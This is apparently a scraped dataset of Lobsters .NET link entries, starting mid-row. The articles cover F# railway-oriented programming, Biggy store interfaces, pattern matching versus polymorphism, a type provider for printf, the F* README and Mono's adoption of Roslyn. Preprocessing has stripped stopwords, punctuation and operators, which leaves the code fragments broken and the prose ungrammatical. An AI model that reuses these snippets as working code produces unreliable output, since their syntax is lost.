combinedvalidation x x normal pipe onetrack input result two track output use bind pipe result two track output use bind pipe difference implementation previous one definition dataoriented rather functionoriented explicit parameter initial data value namely x x passed first function output passed second function previous implementation repeated data parameter focus function data flow let combinedvalidation bind bind alternative bind another way combine switch adapting two track input simply joining directly together make new bigger switch word becomes think combined track actually another switch see cover middle bit one input two output really done form composition switch like composition result another switch always add another switch resulting even bigger thing still switch code switch composition standard symbol used bit like normal composition symbol railway track angle let x match x success failure f failure f actual implementation straightforward pas single track input x first switch success pas result second switch otherwise bypass second switch completely rewrite combinedvalidation function use switch composition rather bind let combinedvalidation one simplest yet think easy extend course fourth validation function append end bind v switch composition two different concept first glance seem quite similar difference recap bind one switch function parameter adapter convert switch function fully twotrack function twotrack input twotrack output switch composition two switch function parameter combine series make another switch function would use bind rather switch composition depends context existing twotrack system need insert switch use bind adapter convert switch something take twotrack input hand entire data flow consists chain switch switch composition simpler switch composition term bind happens switch composition written term bind connect first switch bindadapted second switch get thing switch composition two separate switch switch composed together make new bigger switch thing done using bind second switch switch composition operator rewritten using way thinking let bind implementation switch composition much simpler first one also abstract whether easier comprehend beginner another matter find think function thing right rather conduit data approach becomes easier understand converting simple function railwayoriented programming model get hang fit sort thing model example say function switch regular function say want insert flow real example say want trim lowercase email address validation complete code let canonicalizeemail input input email inputemailtrim tolower code take singletrack request return singletrack request insert validation step update step well turn simple function switch function use switch composition talked word need adapter block concept used bind except time adapter block slot onetrack function overall adapter block switch code trivial need take output one track function turn twotrack result case result always success convert normal function switch let switch f x f x success railway term added bit failure track taken whole look like switch function onetrack input twotrack output course failure track dummy switch never actually get used switch available easily append canonicalizeemail function end chain since beginning extend rename function usecase let usecase switch canonicalizeemail try testing see happens let goodinput name alice email uppercase usecase goodinput printfn canonicalize good result canonicalize good result success name alice email uppercase let badinput name email uppercase usecase badinput printfn canonicalize bad result canonicalize bad result failure name must blank creating twotrack function onetrack function previous example took onetrack function created switch enabled u use switch composition sometimes though want use twotrack model directly case want turn onetrack function twotrack function directly need adapter block slot simple function typically call adapter map actual implementation straightforward twotrack input success call function turn output success hand twotrack input failure bypass function completely code convert normal function twotrack function let map onetrackfunction twotrackinput match twotrackinput success success onetrackfunction failure f failure f use canonicalizeemail let usecase map canonicalizeemail normal composition note normal composition used map canonicalizeemail fully twotrack function connected output switch directly word onetrack function switch exactly map choice converting deadend function twotrack function another function often want work function function accepts input useful output example consider function update database record useful sideeffects normally return anything incorporate kind function flow need save copy input call function ignore output return original input passing next function chain railway point view equivalent creating deadend siding like make work need another adapter function like switch except time slot onetrack deadend function convert singletrack pas function onetrack output code call tee unix tee command let tee f x f x ignore x converted deadend function simple onetrack pas function use data flow converting using switch map described code use style deadend function let updatedatabase input dummy deadend function let usecase switch canonicalizeemail switch tee updatedatabase alternatively rather using switch connecting use map connect variant implementation exactly us style normal composition let usecase bind bind map canonicalizeemail map tee updatedatabase handling exception dead end database update might return anything mean might throw exception rather crashing want catch exception turn failure code similar switch function except catch exception call trycatch let trycatch f x try f x success ex failure exmessage modified version data flow using trycatch rather switch update database code let usecase switch canonicalizeemail trycatch tee updatedatabase function twotrack input function seen far one input always work data travelling along happy path sometimes though need function handle track example logging function log error well success done previously create adapter block time slot two separate onetrack function code let doublemap successfunc failurefunc twotrackinput match twotrackinput success success successfunc failure f failure failurefunc f aside use function create simpler version map using id failure function let map successfunc doublemap successfunc id use doublemap insert logging data flow let log twotrackinput let success x printfn debug success far x x let failure x printfn error x x doublemap success failure twotrackinput let usecase switch canonicalizeemail trycatch tee updatedatabase log test code result let goodinput name alice email good usecase goodinput printfn good result debug success far name alice email good good result success name alice email good let badinput name email usecase badinput printfn bad result error name must blank bad result failure name must blank converting single value twotrack value completeness also create simple function turn single simple value twotrack value either success failure let succeed x success x let fail x failure x right trivial calling constructor result type get proper coding see using rather union case constructor directly isolate change behind scene combining function parallel far combined function series something like validation might want run multiple switch parallel combine result like make easier reuse trick switch composition rather many focus single pair make new switch easily chain together add many want word need implement logic adding two switch parallel first take input apply switch next look output switch successful overall result success either output failure overall result failure well function call plus let plus x match x x success success success failure success failure success failure failure failure failure failure new problem two success two failure combine inner value used example implies sort operator use may true string ints true general method combining value might change different context rather trying solve punt letting caller pas function needed rewritten version let plus addsuccess addfailure x match x x success success success addsuccess failure success failure success failure failure failure failure failure addfailure put new function first parameter list aid partial application implementation parallel validation create implementation validation function function succeed return request unchanged addsuccess function return either parameter function fail return different string addfailure function concatenate validation operation want like function part result naturally lead wanting use operator symbol unfortunately reserved use like create plus function validation function let let addsuccess return first let addfailure concat plus addsuccess addfailure using create single validation function combine three smaller validation let combinedvalidation try test earlier test let name email combinedvalidation printfn name must blank email must blank test let name alice email combinedvalidation printfn email must blank test let name alice email good combinedvalidation printfn name alice email good first test two validation error combined single string wanted next tidy main dataflow function using usecase function instead three separate validation function let usecase combinedvalidation switch canonicalizeemail trycatch tee updatedatabase test see success flow way end email lowercased trimmed test let name alice email uppercase usecase printfn name alice email uppercase might asking create way oring validation function well overall result valid either part valid answer yes course try suggest use symbol dynamic injection function another thing might want add remove function flow dynamically based configuration setting even content data simplest way create twotrack function injected stream replace id function needed idea let injectablefunction configdebug debuglogger else id try real code type config debug bool let debuglogger twotrackinput let success x printfn debug success far x x let failure id nt log doublemap success failure twotrackinput let injectablelogger config configdebug debuglogger else id let usecase config combinedvalidation map canonicalizeemail injectablelogger config use let input name alice email good let releaseconfig debugfalse input usecase releaseconfig ignore output let debugconfig debugtrue input usecase debugconfig ignore debug output debug success far name alice email good step back review done far using railway track metaphor created number useful building block work dataflow style application classify function roughly like used create new track convert one kind track another link section track together make bigger piece track function form loosely called combinator library group function designed work type represented railway track design goal bigger piece built adapting combining smaller piece function like bind map plus etc crop sort functional programming scenario think functional pattern similar oo pattern etc together concept description succeed constructor take onetrack value creates twotrack value success branch context might also called return pure fail constructor take onetrack value creates twotrack value failure branch bind adapter take switch function creates new function accepts twotrack value input infix version bind piping twotrack value switch function normal composition combiner take two normal function creates new function connecting series switch composition combiner take two switch function creates new switch function connecting series switch adapter take normal onetrack function turn switch function also known lift context map adapter take normal onetrack function turn twotrack function also known lift context tee adapter take deadend function turn onetrack function used data flow also known tap trycatch adapter take normal onetrack function turn switch function also catch exception doublemap adapter take two onetrack function turn single twotrack function also known bimap plus combiner take two switch function creates new switch function joining parallel adding result also known context plus combiner tweaked specifically validation function modelled binary railway track function complete code complete code function one place made minor tweak original code presented function defined term core function called either trycatch given extra parameter exception handler twotrack type type result tsuccess tfailure success tsuccess failure tfailure convert single value twotrack result let succeed x success x convert single value twotrack result let fail x failure x apply either success function failure function let either successfunc failurefunc twotrackinput match twotrackinput success successfunc failure f failurefunc f convert switch function twotrack function let bind f either f fail pipe twotrack value switch function let x f bind f x compose two switch another switch let bind convert onetrack function switch let switch f f succeed convert onetrack function twotrack function let map f either f succeed fail convert deadend function onetrack function let tee f x f x x convert onetrack function switch exception handling let trycatch f exnhandler x try f x succeed ex exnhandler ex fail convert two onetrack function twotrack function let doublemap successfunc failurefunc either successfunc succeed failurefunc fail add two switch parallel let plus addsuccess addfailure x match x x success success success addsuccess failure success failure success failure failure failure failure failure addfailure type v shape far focused entirely shape track cargo train magical railway good carried change go along length track example cargo pineapple magically transform apple go tunnel called cargo apple transform banana go tunnel called magical railway important rule namely connect track carry type cargo case connect cargo coming apple cargo going also apple course always true track carry cargo mismatch kind cargo cause error notice discussion far mentioned cargo instead spent time talking onetrack v two track function course go without saying cargo must match hope see shape track really important thing cargo carried generic type powerful worried type cargo function completely generic bind map switch plus function care type cargo shape track extremely generic function benefit two way first way obvious generic function reusable implementation bind work type long shape right another subtle aspect generic function worth pointing generally know nothing type involved constrained result introduce bug see mean look signature map val map b result c result b c take function parameter b value result c return value result b c know anything type b c thing know type show function parameter success case first result type b show function parameter success case second result type c show failure case first second result show function parameter deduce return value type b come know type b know make one function parameter know make one give make b u get know type either know make one first result parameter use see forced get success value result c parameter pas function parameter success case result b c return value must constructed result function finally logic applies c forced get failure value result c input parameter use construct failure case result c return value word basically one way implement map function type signature generic choice hand imagine map function specific type needed like val map int int result int int result int int case come huge number different implementation list could swapped success failure track could added random number success track could ignored function parameter altogether returned zero success failure track implementation sense expect possible know advance type int therefore manipulate value way supposed le know type le likely make mistake failure type function transformation applies success track failure track left alone map merged incoming failure bind implies failure track must type way post used string next post change failure type something useful find site useful download ebookpdf summary guideline beginning series promised give simple recipe could follow might feeling bit overwhelmed instead making thing simpler seem made thing complicated shown lot different way thing bind v compose map v switch approach use way best course never one scenario nevertheless promised guideline used basis reliable repeatable recipe guideline use doubletrack railway underlying model dataflow situation create function step use case function step turn built smaller function eg validation function use standard composition connect function need insert switch flow use bind need insert singletrack function flow use map need insert type function flow create appropriate adapter block use guideline may result code particularly concise elegant hand using consistent model understandable people need maintained guideline main bit implementation far note especially use everywhere final usecase function open railwaycombinatormodule let let addsuccess return first let addfailure concat plus addsuccess addfailure let combinedvalidation let canonicalizeemail input input email inputemailtrim tolower let updatedatabase input dummy deadend function new function handle exception let updatedatebasestep trycatch tee updatedatabase fun ex exmessage let usecase combinedvalidation map canonicalizeemail bind updatedatebasestep log one final suggestion working team nonexperts unfamiliar operator symbol put people extra guideline respect operator use operator particular mean use operator like unless everyone aware exception made define operator top module function used example operator could defined top validation module used later module reading like approach also see applied fizzbuzz also slide video show take approach point turn proper blog post presented topic ndc oslo click image view video slide used interested functional approach domain modelling design might enjoy domain modeling made functional book beginnerfriendly introduction cover domain driven design modeling type functional programming recipe functional app series railway oriented programming comment please enable javascript view comment powered disqus blog comment powered
613,Lobsters,dotnet,"C#, F#, .NET programming",Biggy: Interface Semantics and The Interface Segregation Principle,http://typecastexception.com/post/2014/05/19/Biggy-Interface-Semantics-and-The-Interface-Segregation-Principle.aspx,biggy interface semantics interface segregation principle,image dennis yang right reserved biggy project architecture biggy underwent major overhaul proposed kscott allen abstracting backing store background biggy create different backing store afford different level compatibility meaningful backing store abstraction github issue closer look interface segregation principle interface segregation principle robert uncle bob martin defining biggylist api rethinking interface structure different perspective basic ability create read update delete record core function expect context biggy inmemory list summing additional resource item interest john google,image dennis yang right reserved past month working hard rob conery biggy project highperformance inmemory query persistence tool net recently architecture biggy underwent major overhaul implementing interfacedriven structure proposed kscott allen new structure created much cleaner separation core inmemory list function biggy backing data store core biggy provides inmemory synchronized abstraction various type backing store current architecture store implementation represented one interface injected memory list constructor argument abstracting backing store behind set interface isolates inmemory list implementation change backing store also allows list call backing store without worrying store implementation work pretty darn well however wonder might approaching thing wrong perspective designing interface structure note additional background biggy see following abstracting backing store background biggy current form biggy architecture present set interface represent backing data store interface represent backing store biggy public interface ibiggystore list load void clear add item list add list item public interface iupdateablebiggystore ibiggystore update item remove item list remove list item public interface iqueryablebiggystore ibiggystore iqueryable asqueryable interface represent potential capability different backing store general work database file store persistence mechanism generally seek perform basic crud function create new record read record store update existing record delete record different backing store afford different level compatibility however persistence engine afford capability directly example filebased json store read record file reading file data memory however file store directly queryable sense relational database might technically update delete specific record middle file mechanic file system without essentially writing actual database system dealing ugly lowlevel file system stuff since reason utilizing filebased store keep thing simple often keep data humanreadable format cross purpose might well scale relational system point filebased store read data file write data file either bulk appending record end file also clear entire file function effectively represented ibiggystore interface lacking method update record remove delete record order update remove existing record essentially stuck flushing entire modified file back disk contrast relational store tends include crud functionality query specific record set record insert update delte record etc function represented ibiggystore interface additional iupdateablebiggystore potentially iqueryablebiggystore interface used conjunction meaningful backing store abstraction proposing interfacedriven architecture k scott allen indicates thinking term interface segregation principle explains discussion github issue biggy repo example mongo db iqueryable data source might make sense allow effecient query advertising iqueryablebiggystore reason implement interface behind scene store iqueryable text file data iqueryable would implement interface text file store updateable interface make sense data store know update persist individual item think would tricky file full json allen view different store present different potential capability respect data access manipulation interface implemented properly reflect advertise client make total sense solid example interface representing actual capability available given store scenario might define filebased store something like simplified example filebased store implementation public class examplefilestore ibiggystore local method supporting core file store functionality list ibiggystore load code read data file void ibiggystore clear code clear data file ibiggystore add item code append record end file list ibiggystore add list item code append many record end file might similarly define store relational database like simplified relational store implementation public class examplerelationalstore ibiggystore iupdateablebiggystore iqueryablebiggystore ibiggy implementation list ibiggystore load code read record table void ibiggystore clear code clear record table ibiggystore add item code insert record table list ibiggystore add list item code insert many record table updateable implementation iupdateablebiggystore update item code update specific record table iupdateablebiggystore remove item code delete specific record table list iupdateablebiggystore remove list item code delete set specific record table queryable implmentation iqueryable iqueryablebiggystore asqueryable code return instance iqueryable representing table record see relational store implementation generally make use available interface method possible exception iqueryablebiggystore order properly return queryable instance would need provider return iqueryable linqtosql would need write two example case present interfacebased apis accurately reflect capability store client code implement functionality required implementing proper combination interface closer look interface segregation principle interface segregation principle isp described part robert uncle bob martin solid principle objectoriented design state client forced depend method use potential corollary isp often cited find direct source interface belong client implementation perspective defining interface abstract various data store implementation separation implied ibiggystore iupdateablebiggystore iqueryablebiggystore make sense different client consume featured represented various store implementation dependency created client interface indeed consistent isp within biggy though objective represent data store inmemory list structure synchronize data inmemory abstraction persisted actual store one primary goal separating store implementation inmemory list implementation isolate memory list implementation change store implementation word built application consumes biggy inmemory data source want able swap commonly scale backing store without impacting least minimally impacting application code defining biggylist api biggy project defined another interface ibiggy represents core feature set required given biggylist implementation ibiggy interface public interface ibiggy ienumerable void clear int count update item remove item list remove list item add item list add list item iqueryable asqueryable bool inmemory get set event eventhandler biggyeventargs itemremoved event eventhandler biggyeventargs itemadded event eventhandler biggyeventargs itemsadded event eventhandler biggyeventargs changed event eventhandler biggyeventargs loaded event eventhandler biggyeventargs saved see biggylist implementation requires crud feature saw defined previously multiple biggystore interface word store implementation offer required feature biggy list expect way perform action anyway one assumption behind current interface architecture essentially injection store biggylist implementation constructor argument simplified generic example might look something like simplified biggylist implementation public class biggylistexample ibiggy ibiggystore store iupdateablebiggystore updatablestore iqueryablebiggystore queryablestore list item code various event hook implementation code public biggylistexample ibiggystore store store store updatablestore store iupdateablebiggystore queryablestore store iqueryablebiggystore item storeload public void clear storeclear itemsclear public int count return itemscount public update item return updatablestoreupdate item public remove item itemsremove item return updatablestoreremove item public list remove list item foreach var item item itemsremove item updatablestoreremove item return item public add item itemsadd item return storeadd item public list add list item itemsaddrange item return storeadd item public iqueryable asqueryable return queryablestoreasqueryable public ienumerator getenumerator return itemsgetenumerator systemcollectionsienumerator systemcollectionsienumerablegetenumerator return itemsgetenumerator given example simplified implementation would appear class could actually represent core baseclass type implementation except current assumption store interface discussed store offer feature required class function properly example passed examplefilestore class defined previously code fail since examplefilestore implement iupdateablebiggystore iqueryablebiggystore could current iteration biggy add null check store instance code fail try execute interface method present checking null calling potentially missing interface method public update item updatablestore null return updatablestoreupdate item even evil though think updated data nothing happened originally defined saveall method part ibiggystore interface made sense working filebased store updating record essentially requires rewriting entire file disk saveall method defined part ibiggystore could rewritten roughly modified null check example public update item updatablestore null return updatablestoreupdate item else storesaveall item return item code assumes passing entire modified list back store store content overwritten reflecting change including update deletion work well filebased store store explicit update andor delete method available first part conditional execute trouble twofold first one core assumption implied biggy library inmemory list backing store kept sync realtime appear way client case including saveall method part public interface implies possible make series change saving flushing back store word real time secondly saveall implies unit work architecture due widespread use popular orms project owner rob explicitly opted unit work favor composed transaction model would prudent avoid using term part public store api goal biggy present transactional persistence model writes store save implies something else could course create implementation ibiggylist take account limitation certain store accomplish brute force provided basic interface limit effectiveness interface architecture perfect world seems able create single basic biggylist implementation unaffected moving one store next special case store list capable using iqueryable could created using specialized interface able assume core crud functionality compatibility within biggy various store rethinking interface structure different perspective seems like decision make one hand defining store interface according available functionality make sense probably keeping proper objectoriented design principle technically possible example update specific item store without rewriting entire list back disk advertising capability update item method would make sense defining store straightforward dataaccess library however explicitly defining store interface provide compatibility biggy library since interface belongs client implementation perhaps consider meeting need client first overarching premise biggy library provide inmemory abstraction data store along thing might expect store access data source expect version basic crud functionality available different store may present capability beyond basic crud iqueryable returned mongo andor linqtosql example basic ability create read update delete record core function expect context biggy inmemory list case certain store directly support one basic crud feature might instead opt implement bruteforce approach store implementation level word order consumable biggy store must compliant minimum feature set required ibiggy propose combining former ibiggystore iupdateablebiggystore proposed store interface organization public interface ibiggystore list load void clear add item list add list item update item remove item list remove list item public interface iqueryablebiggystore ibiggystore iqueryable asqueryable leave iqueryablebiggystore interface distinct separate item since store option directly return iqueryable anyway b premise biggy working data directly memory querying directly backing store iqueryable explicitly contrary notion creating query execute deferred manner backing store c including asqueryable part basic ibiggy interface implies always possible work store via iqueryable instance fact necessarily possible least practical sense might considered violation interface segregation principle theory fact take bruteforce approach implement example update method filebased store writing entire file content disk including updated data reading updated file back disk memory practical sense write effective iqueryable provider filebased store exactly filebased store already read file content inmemory list mean iqueryablebiggystore useful using iqueryable biggylist desirable option simply may case one optin use specialized store interface potentially specialized implementation ibiggy case iqueryable option desired almost make sense create specialized ibiggy implementation purpose since usage may differ significantly standard implementation keeping might find following biggy list interface modified ibiggy separate iqueryablebiggy interface public interface ibiggy ienumerable void clear int count update item remove item list remove list item add item list add list item bool inmemory get set event eventhandler biggyeventargs itemremoved event eventhandler biggyeventargs itemadded event eventhandler biggyeventargs itemsadded event eventhandler biggyeventargs changed event eventhandler biggyeventargs loaded event eventhandler biggyeventargs saved public interface iqueryablebiggy ibiggy iqueryable asqueryable summing creating store attendant interface context designing straightforward dataaccessquerying library direct consumption client code original interface structure would likely right choice interface semantics would correctly describe functionality store implementation capable providing biggy created additional abstraction layer inmemory list representation store might better define basic store interface term minimal biggylist implementation require build store implementation meet need client case biggylist would fascinated contrary view comment email address author section additional resource item interest john google
614,Lobsters,dotnet,"C#, F#, .NET programming",Inverted Polymorphism With Pattern Matching,http://deliberate-software.com/inversed-polymorphism/,inverted polymorphism pattern matching,oo interfacesclasses pattern matching type section comment,last post power pattern matching saw powerful match statement f using match allows compiler give u warning missing case matter type let look pattern matching change design allowing inversion usual oo way polymorphism example probably familiar everyone getting database connection public interface ipaymentrepository ienumerable ipayment getall inmemorycs public class inmemory ipaymentrepository public ienumerable ipayment getall return configpaymentsvalues postgrescs public class postgres ipaymentrepository public ienumerable ipayment getall throw new notimplementedexception repositoryfactorycs public class repositoryfactory public static ipaymentrepository getpaymentrepo configconfiguration useinmemory true return new inmemory else return new postgres somewhere code var repo repositoryfactorygetpaymentrepo var payment repogetall example two concrete implementers ipaymentrepository one implementation typical oo way deal polymorphism usually best practice would put class file let look would invert polymorphism c class interface use pattern matching type paymentrepository inmemory postgres let getall function inmemory configpaymentsvalues postgres raise notimplementedexception let getpaymentrepo match configconfiguration useinmemory true inmemory postgres somewhere code let repo paymentsgetpaymentrepo let payment paymentsgetall repo notice separated behavior type paymentrepositoryinmemory paymentrepositorypostgres empty type much like enum still able get polymorphic behavior using match would want store behavior separate type storing behavior separate type change effect single behavior adding new function changing function api removing function easier grouped together change api getall function harder traditional oo interface structure requiring modifying several file similarly change requiring adding new type difficult pattern matching structure require finding every pattern match adding additional case thankfully f compiler check pattern match interface u letting u use best tool job safety adding new type easy interface developer left without assistance find place concrete class instantiated add new type neither compiler offer warning new interface subclass pattern matching polymorphism compiler warn missing case every place change need made harder add new type pattern matching safer adding type modifying behavior oo interfacesclasses easier le safe harder safe pattern matching type harder safe easier safe almost always find modifying function interface find adding new type typical use case pattern matching probably better choice consider change want add new function ipaymentrepository interface change location memory dictionary stored internally interface class example requires editing three separate file ipaymentrepostorycs public interface ipaymentrepository ienumerable ipayment getall void add ipayment payment inmemorycs public class inmemory ipaymentrepository public dictionary int ipayment payment new dictionary int ipayment public void add ipayment payment paymentsadd paymentgetid payment public ienumerable ipayment getall return paymentsvalues postgrescs public class postgres ipaymentrepository public void add ipayment payment throw new notimplementedexception public ienumerable ipayment getall throw new notimplementedexception change add new function pattern matching example type paymentrepository inmemory dictionary int ipayment postgres let add db payment ipayment match db inmemory payment paymentsadd paymentgetid payment postgres raise notimplementedexception let getall function inmemory payment paymentsvalues postgres raise notimplementedexception case concerned f type state actually field like regular class notice dictionary int ipayment next inmemory type field new field need named used pattern match time named payment inside add getall function pattern match inmemory fact add pattern match compiler would give u warning option traditional interface verse pattern matching neither way truly best every circumstance come tradeoff liken tradeoff grain data whichever way system likely change way want optimize type good news f mix relatively easy convert back forth depending system changing personally find f pattern matching significantly easier read code c requires twice line three separate file add complexity burden reason f code safer smaller easier modify c equivalent write code c vbnet right could add project f today three language callable two could start breaking small library us feature immediately f module class callable c like dll library mind set f apart language powerful safe c high performance interoperability existing c library want additional reading topic polymorphism check section sicp discussion hn comment
615,Lobsters,dotnet,"C#, F#, .NET programming",C# Algorithmic Trading Backtesting Platform,https://www.quantconnect.com/blog/new-html5-ide-and-community-discussion-feed/,c algorithmic trading backtesting platform,,last month working day night silently constantly pushing feature update make quantconnect better humbling experience looking back earlier cluttered buggy coding environment decided review revisit need scratch focus really want reimagined coding environment fresh eye taking pause made leap deciding scrap entire interface rebuild scratch lesson learned change required iterative set work today launching quantconnect algorithm terminal click play video walkthrough powerful cloud backtesting engine rebuilt pure environment load faster previous ide maintains feature git support project based design multiple file support algorithm cloning built dynamic community feed directly coding environment constantly pushing update stream community post question share algorithm backtests community publicly shared algorithm get automatically ranked engagement clone popular strategy rising top list member private group academic institution still clone private algorithm group tab also created community reputation system badge check next name see reputation score reputation increase run intensive backtests community member clone algorithm discussion get upvoted build reputation use profile job interview show quant prowess
616,Lobsters,dotnet,"C#, F#, .NET programming",Type Safe Printf via Type Providers (F#),http://blog.mavnn.co.uk/type-safe-printf-via-type-providers/,type safe printf via type provider f,brian mckenna video gist bit help tomas quotation tomas explanation github,brian mckenna posted interesting video gist implementing type safe printf idris dependent type led nice little rabbit hole wondering something similar could achieved f type provider bit help tomas final solution turned surprisingly nice although quite clean idris original taking format string parsing look similar idris version common ml history two language type format fstring format fint format char format end let parseformatstring str let rec parseformat char match char fint parseformat fstring parseformat c c parseformat end parseformat seqtolist str might efficient flexible parsing method really point current exercise clear next want create quotation represents curried function based format type needed tomas help turn nt easy way syntax usually used build quotation type provider tomas reminded microsoftfsharpquotations namespace give direct access underlying class represent expression tree quotation allows u build expression tree recusively check tomas explanation technique detail work open systemreflection open microsoftfsharpquotations let rec invoker printer format match format end let arr exprnewarray typeof string listrev printer let conc typeof string getmethod concat typeof string exprcall conc arr c invoker string char c printer fint let v var v typeof int let printer string int exprvar v exprlambda v invoker printer printer fstring let v var v typeof string let printer exprvar v string exprlambda v invoker printer printer hard stuff way type provider boiler plate going provide type provider named tprint take single parameter format string parameter supplied provide single static property fsharpfunc type match signature required format string open systemreflection open providerimplementationprovidedtypes open microsoftfsharpcorecompilerservices let tomethod format let invokecode invoker format let invoketype invokecodetype providedproperty show invoketype isstatic true gettercode fun invokecode typeprovider type tprintprovider config typeproviderconfig inherit typeproviderfornamespaces let n typesetprovided let asm assemblygetexecutingassembly let tprintprovider providedtypedefinition asm n tprint typeof obj let parameter providedstaticparameter formatstring typeof string tprintproviderdefinestaticparameters parameter fun typename args let formatstring args string let provider providedtypedefinition asm n typename typeof obj providerhideobjectmethods true formatstring parseformatstring tomethod provideraddmember provider thisaddnamespace n tprintprovider assembly typeproviderassembly put together get type provider allows tprint string show hello world val string hello string world tprint number one number two string show string val string number one number two string string nothing built printf nt already start opening option providing much idiomatic f style apis really seen far type provider tend provide oo style interface interesting idea explore full code found github
617,Lobsters,dotnet,"C#, F#, .NET programming",Pattern Matching - Make the Compiler Work for You,http://deliberate-software.com/function-pattern-matching/,pattern matching make compiler work,,pattern matching simple tool make code safer easier read consider following code convert int string public enum language spanish english public static string convert int number language lang string ret lang languageenglish switch number case ret zero break case ret one break default ret break else lang languagespanish switch number case ret zero break case ret uno break default ret break return ret happens make simple change public enum language spanish english german code still compile sure compileride offer u indication something missing nope code potential bug exposed runtime nothing tell u made fail gracefully ensuring code always return least empty string created bug really caught something external either automated test manual checking oo purist antiif guy probably leaping seat use class interface yell ok sure assert make thing even worse public interface ilanguage string convert int num public class spanish ilanguage public string convert int num var ret switch num case ret zero break case ret uno break default ret break return ret public class english ilanguage public string convert int num var ret switch num case ret zero break case ret one break default ret break return ret somewhere else public static string convert int x language lang return getlanguage lang convert x public static ilanguage getlanguage language lang switch lang case languageenglish return new english break case languagespanish return new spanish break default throw new exception turned line one file three file counting namespaces import new structure give u additional safety add new concrete implementation add new enum value code even likely cause bug first implicit coupling enum concrete class could get rid enum pas concrete class something still say concrete class instantiate imagine compiler could warn u either enum class changed imagine instead hunt possible us could compile fix error good news check f code never seen f know look completely crazy still look little weird try read think surprise function called convert keep mind type always come value code make lot sense parameter c would int number f written number int ask match number equivalent switchcase c see second lot powerful let convert number int lang language string match lang languageenglish match number one two using enum c file missing something right spanish german part try compile see programfs warning incomplete pattern match expression example value enum language may indicate case covered pattern spittake mushroom soup compiler caught potential bug u c runtime bug le powerful simple code way normally get additional safety free unit integration test would ever catch class error heck really want keep class interface c glue code f still get benefit let convert number lang match lang languageenglish english convert number still call c class compiler give u warning add new enum value way pattern matching able clearly remove edge case converted unsafe switch statement type safe match bonus round already seen pattern matching make better switchcase statement thankfully matchwith statement allows pattern matched clause match condition true let convert number lang match lang languageenglish match number x x large zero languagespanish match number x x grande zero running compiler give u homejackprogrammingmonadsfsharpmonadsfsharpprogramfs warning incomplete pattern match expression example value may indicate case covered pattern however pattern rule clause might successfully match value monadsfsharp right check number lastly possible match combination value convert complex structure something simpler using trick compiler still intelligent enough check missing case let convert number lang match lang number languageenglish zero languageenglish one languageenglish x x larger one languageenglish dunno languagespanish zero languagespanish x x grande introduce equivalent default c switchcase statement pattern languageenglish set default number languageenglish already matched bug code missing languagespanish number compiler say programfs warning incomplete pattern match expression example value may indicate case covered pattern however pattern rule clause might successfully match value monadsfsharp lastly let show final result converting original function f entire function single pattern match remove matchwith line use function keyword simply match parameter reversed clarity need written let convert function languageenglish zero languageenglish one languageenglish languagespanish zero languagespanish uno languagespanish original line convert function converted safer line never specify type lang number return type compiler able figure code wrote convinced point pattern matching big step forward safety ease development sure else would convince safety mean le time spent tracking bug time adding feature
618,Lobsters,dotnet,"C#, F#, .NET programming",F* released with Apache2 license,https://github.com/nikswamy/FStar,f released license,f verification system effectful program f website wwwfstarlangorg installation installmd tutorial f tutorial wiki f wiki editing f code editor support f wiki online f editor f tutorial extracting executing f code executing f code via ocaml f wiki c wasm kremlin tool vale tool chatting f zulip http fstarzulipchatcom zulip community mailing list fstarclub mailing list list archive searchable join blog f mass reporting issue f issue tracker online f editor contributing contributingmd license apache license license,f verification system effectful program f website information f found wwwfstarlangorg installation see installmd tutorial f tutorial provides first taste verified programming f explaining thing example wiki f wiki contains additional usually indepth technical documentation f editing f code edit f code using favourite text editor emacs visual studio code atom vim extension add special support f including instance syntax highlighting code completion quick navigation type hint interactive development detail editor support f wiki also edit simple example directly browser using either online f editor part f tutorial extracting executing f code default f verifies input code compile execute execute f code one need translate instance ocaml f using f code extraction facility invoked using command line argument codegen ocaml codegen fsharp detail executing f code via ocaml f wiki also code written clike shalowly embedded dsl extracted c wasm kremlin tool code written asmlike deeply embedded dsl extracted asm vale tool chatting f zulip user chat f ask question http fstarzulipchatcom zulip good open source alternative slack community mailing list fstarclub mailing list various f announcement made general public eg release new paper etc user ask question ask help discus provide feedback announce job requiring least year f experience etc list archive public searchable member post join blog f mass blog also expected become important source information news f project reporting issue please report issue using f issue tracker github filing please use search make sure issue nt already exist nt maintain old release possible please use online f editor directly github source check problem still exists master branch contributing see contributingmd license f released apache license detail see license
619,Lobsters,dotnet,"C#, F#, .NET programming",.NET Reference Source,http://referencesource.microsoft.com/,net reference source,reference source,ï reference source
620,Lobsters,dotnet,"C#, F#, .NET programming",Mono and Roslyn,http://tirania.org/blog/archive/2014/Apr-09.html,mono roslyn,net compiler platform navigate source code roslyn mono showed roslyn running mono handful patch fork adopting roslyn mono sdk interactive c shell adopting roslyn monodevelopxamarin studio c standard mono project roslyn note,last week microsoft open sourced roslyn net compiler platform c vb roslyn effort create new generation compiler written managed code addition standard batch compiler contains compiler api used kind tool want understand manipulate c source code roslyn foundation power new smart visual studio also used static analysis code refactoring even smartly navigate source code great foundation tool developer able build honor sharing stage anders hejlsberg published source code showed roslyn working mac mono well showing patch demoed stage running mono roslyn mono build showed roslyn running mono want run copy roslyn today need use fresh version mono apply handful patch roslyn source code released contains c feature patch add bootstrapping phase allowing roslyn built c compiler source also couple patch deal path window v unix path well unix makefile build result sadly roslyn build script depends number feature msbuild neither mono monodevelopxamarinstudio support currently hope address future maintain makefilebased system use roslyn patch longer apply tip roslyn master roslyn active development updating patch track roslyn master fork moving forward currently roslyn generates debug information using visual studio native library debug switch work providing alternative implementation us mono symbol writer adopting roslyn mono sdk goal keep track roslyn developed officially released bundle roslyn compiler mono addition provide uptodate compliant visual basicnet compiler unix platform plan currently keep compiler around implement various c feature mono c compiler couple reason batch compiler fine tuned year daytoday compilation currently faster roslyn compiler second one compiler power interactive c shell launch something interesting functionality currently available open sourced roslyn stack addition plan distributing various roslyn assembly mono user build tool top roslyn box adopting roslyn monodevelopxamarin studio roslyn really shine use ides started effort adopt roslyn monodevelopxamarin studio mean underlying nrefactory engine also adopt roslyn going gradual process migration goal keep using mono c compiler service engine bit bit replace roslyn component evaluating various area roslyn positive impact plan start code completion later support full spectrum feature nrefactory provides refactoring code generation c standard related roslyn figured time share last couple month ecma c committee working updating spec reflect c time around spec benefit two independent compiler implementation mono project roslyn goal contribute fix roslyn team make sure roslyn work great unix system hopefully provide bug report bug fix time go excited release roslyn amazing piece technology one sophisticated compiler design available great place learn great c idiom best practice great foundation great tooling c vb thanks everyone microsoft made possible thanks everyone roslyn team starting contributing delivering ambitious project note roslyn us tracing apis available mono must use newer version mono build roslyn even include patch add french quote anders demoed make sure skip patch nt want michael hutchinson reference form reference 